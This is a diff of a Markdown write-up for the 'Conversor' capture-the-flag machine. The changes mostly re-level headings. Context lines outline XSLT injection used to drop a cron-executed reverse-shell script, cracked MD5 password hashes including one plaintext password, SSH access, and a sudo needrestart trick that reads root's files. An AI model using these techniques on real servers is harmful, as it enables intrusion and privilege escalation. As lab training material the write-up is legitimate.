@@ -7,8 +7,8 @@ tags: [xlst injection]
 
 Conversor is an Easy Linux machine focused on XSLT Injection, file write primitives, and abusing cron execution for privilege escalation to a shell. The final privilege escalation uses a clever trick with needrestart to read arbitrary files as root.
 
-# Recon
-## Initial Scanning
+## Recon
+### Initial Scanning
 
 `nmap` finds two open TCP ports, SSH (22) and HTTP (80):
 
@@ -32,7 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 76.42 seconds
 ```
 The HTTP service redirects to conversor.htb, so add it to `/etc/hosts`.
 
-## conversor.htb - TCP 80 (Apache HTTP)
+#### conversor.htb - TCP 80 (Apache HTTP)
 Navigating to `http://conversor.htb` shows a simple login page with a Register option. 
 
 <img width="914" height="377" alt="image" src="https://github.com/user-attachments/assets/9f94b721-0bef-456b-8e55-7a57ea3a5429" />
@@ -49,9 +49,7 @@ This is immediately suspicious because XSLT is known to allow extended functiona
 `/about` provides a downloadable ZIP containing the web application source code.
 <img width="900" height="419" alt="image" src="https://github.com/user-attachments/assets/382bf289-9bdc-4158-8b82-d3d2790f0235" />
 
-### Source Code Review
-
-#### app.py
+#### Source Code Review
 
 User database is stored in users.db. Uploaded XML/XSLT files are saved directly to disk.
 ```
@@ -68,7 +66,6 @@ transform = etree.XSLT(xslt_tree)
 result_tree = transform(xml_tree)
 ```
 
-#### From install.md
 Any `.py` dropped into `/var/www/conversor.htb/scripts/` runs automatically as `www-data` every minute.
 ```bash
 If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
@@ -77,7 +74,7 @@ If you want to run Python scripts (for example, our server deletes all files old
 """
 ```
 
-# Shell as www-data
+## Shell as www-data
 We can leverage the XLST file upload feature to do <a href="https://ine.com/blog/xslt-injections-for-dummies">XLST injection</a>. Since there is no validation on server side, we can injection malicious code to  read/write files from the file system, or execute arbitrary code. 
 
 Using payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#determine-the-vendor-and-version">PayloadAllTheThings</a>, we can do some recon on the XLST version and vendor.
@@ -87,7 +84,7 @@ Using payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/
 
 I have some issues to read the file using `file://` and `document()`, so we need to find other ways. `install.md` mentioned that there is cron job that will run any Python scripts in script folder. We can write our own Python script using XLTS injection and wait until the cron exceuted the script.
 
-## Arbitrary File Write (Python Reverse Shell)
+### Arbitrary File Write (Python Reverse Shell)
 This XLTS file will write `rev.py` on `/var/www/conversor.htb/scripts/` which contain a reverse shell. 
 ```py
 <?xml version="1.0" encoding="UTF-8"?>
@@ -128,7 +125,7 @@ www-data@conversor:~$ ls
 ls
 conversor.htb
 ```
-## Extracting Credentials (users.db)
+### Extracting Credentials (users.db)
 users.db has the MD5 hash password for `fismathack`, `admin` and `user`. 
 ```bash
 www-data@conversor:~/conversor.htb$ cd instance
@@ -160,7 +157,7 @@ Dictionary cache built:
 5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
 ```
 
-# Shell as fismathack
+## Shell as fismathack
 Use `fismathack` username and password for SSH access and get the user flag.
 ```
 ssh fismathack@10.10.11.92  
@@ -176,7 +173,7 @@ fismathack@conversor:~$ cat user.txt
 7856c0ea28******************
 ```
 
-# Root Flag
+## Root Flag
 We can run `/usr/sbin/needrestart` as sudo. `needrestart` is known for LPEs (e.g., (<a href="https://github.com/ns989/CVE-2024-48990"> CVE-2024-48990 </a>), but in this case we can use it in a simpler way.
 
 ```bash
@@ -199,7 +196,7 @@ Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "0a98db1197
 "
 ```
 
-# Conclusion
+## Conclusion
 
 Conversor is a well-designed box illustrating:
 - XSLT Injection (file write primitive via EXSLT)
